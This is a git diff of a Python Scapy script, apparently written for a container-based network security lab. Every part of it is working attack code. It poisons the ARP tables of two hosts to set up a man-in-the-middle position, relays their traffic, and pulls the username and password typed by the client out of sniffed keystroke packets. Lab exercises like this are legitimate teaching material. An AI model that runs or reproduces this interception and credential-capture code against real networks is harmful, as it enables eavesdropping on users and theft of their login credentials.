@@ -8,37 +8,31 @@ attacker_IP = '10.9.0.1'
 random_IP = '10.9.0.7'
 hostA_MAC = '02:42:0a:09:00:05'
 hostB_MAC = '02:42:0a:09:00:06'
-attacker_MAC = '02:42:e9:d4:2c:fa'
-interface = 'br-4886ec97ed5e'
+attacker_MAC = '02:42:14:a1:aa:a6'
+interface = 'br-8fd4a2a351fb'
 
 username = []
 return_cnt = 0
 password = []
 credentials_captured = False
+last_client_seq = 0 
 
 def spoof(spoof_ip, target_ip):
     spoofed_pckt = Ether()/IP(src=spoof_ip, dst=target_ip)/ICMP()
     sendp(spoofed_pckt, iface= interface)
     
 def poison_arp(spoof_ip, spoof_mac, target_ip, target_mac):
-    # spoof an ARP reply to poison the ARP table
     arp_reply = Ether()/ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac, hwsrc=spoof_mac)
     sendp(arp_reply, iface=interface)
     print(f'ARP reply sent - poisoning complete: {arp_reply.summary()}')
 
 def mitm():
-    # spoof an ICMP ping to Host B with Host A's IP address to create ARP entry
     spoof(hostA_IP, hostB_IP)
-    # wait one second
     time.sleep(1)
-    # map Host A's IP Address to the attacker MAC in Host B's ARP table
     poison_arp(hostA_IP, attacker_MAC, hostB_IP, hostB_MAC)
 
-    # spoof an ICMP ping to Host A with Host B's IP address to create ARP entry
     spoof(hostB_IP, hostA_IP)
-    # wait one second
     time.sleep(1)
-    # map Host B's IP Address to the attacker MAC in Host A's ARP table
     poison_arp(hostB_IP, attacker_MAC, hostA_IP, hostA_MAC)
     
 
@@ -49,35 +43,46 @@ def is_client_keystroke(pckt):
     return pckt.haslayer(Raw) and pckt.haslayer(IP) and pckt[IP].src == hostA_IP and pckt[IP].dst == hostB_IP
 
 def forward_packet(pckt):
-    if pckt.haslayer(IP):
-        # Forward packet to its intended destination
-        if pckt[IP].dst == hostA_IP:
-            # Packet going to Host A, set correct MAC
-            pckt[Ether].dst = hostA_MAC
-        elif pckt[IP].dst == hostB_IP:
-            # Packet going to Host B, set correct MAC  
-            pckt[Ether].dst = hostB_MAC
-        
-        # Set source MAC to attacker MAC (we're the relay)
-        pckt[Ether].src = attacker_MAC
-        sendp(pckt, iface=interface, verbose=False)
+    if not pckt.haslayer(IP) or not pckt.haslayer(Ether):
+        return
+    newp = pckt.copy()
+    if newp[IP].dst == hostA_IP:
+        newp[Ether].dst = hostA_MAC
+    elif newp[IP].dst == hostB_IP:
+        newp[Ether].dst = hostB_MAC
+    newp[Ether].src = attacker_MAC
+    sendp(newp, iface=interface, verbose=False)
+
+def _is_newline_byte(b): #ChatGPT generated helper function
+    return b == 10 or b == 13 
 
 def print_user_pass():
     u = "".join(username)
     p = "".join(password)
     print(f'Username: {u}')
     print(f'Password: {p}')
+last_client_seq = 0
+
+
 
 def print_pckt(pckt):
-    global username, password, return_cnt, credentials_captured
-    
+
+    global username, password, return_cnt, credentials_captured, last_client_seq
+
     # Forward the packet first to keep connection alive
-    forward_packet(pckt)
-    
+    #forward_packet(pckt)
+
     # Only process keystrokes from client (Host A) to server (Host B)
+
     if not is_client_keystroke(pckt) or credentials_captured:
         return
-    
+    if pckt.haslayer(TCP) and pckt[TCP].seq == last_client_seq:
+        return
+    # If it's a new packet, update our tracker and continue.
+
+    if pckt.haslayer(TCP):
+        last_client_seq = pckt[TCP].seq
+
     if pckt.haslayer(Raw):
         byte_data = pckt[Raw].load
         # Check for various carriage return patterns
@@ -92,10 +97,12 @@ def print_pckt(pckt):
                     else:
                         password.append(text)
             except:
+                print("error--could not decode byte data")
                 pass
         if return_cnt >= 2 and not credentials_captured:
             print_user_pass()
             credentials_captured = True
+
 
 if __name__ == "__main__":
     # Step 1: Create initial ARP entry by spoofing ping from random IP to Host A
@@ -107,7 +114,9 @@ if __name__ == "__main__":
     print("Step 2: Poisoning Host A's ARP table...")
     poison_arp(random_IP, attacker_MAC, hostA_IP, hostA_MAC)
     time.sleep(1)
-    
+    input("Paused after poisoning Host A. Run `docker exec -it hostA-10.9.0.5 arp -n` in another terminal to verify the entry. Press ENTER here to continue...")
+
+
     # Step 3: Perform full MiTM attack between Host A and Host B
     print("Step 3: Performing MiTM attack...")
     mitm()
